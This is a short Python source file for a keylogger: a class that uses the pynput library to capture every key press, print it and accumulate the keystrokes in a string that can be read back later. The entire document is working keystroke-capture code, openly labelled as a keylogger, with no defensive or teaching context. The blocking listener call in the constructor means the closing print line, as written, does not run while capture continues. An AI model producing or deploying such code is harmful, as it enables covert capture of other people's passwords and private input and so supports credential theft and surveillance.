from pynput.keyboard import Listener


class Keylogger:
    def __call__(self):
        return self.currentKeyboardActivity

    def on_press(self, key):
        print(key)
        self.currentKeyboardActivity += str(key)

    def __init__(self):
        self.currentKeyboardActivity = str()
        with Listener(on_press=self.on_press) as listener:
            listener.join()

kl = Keylogger()

# in some function to update
print(kl())
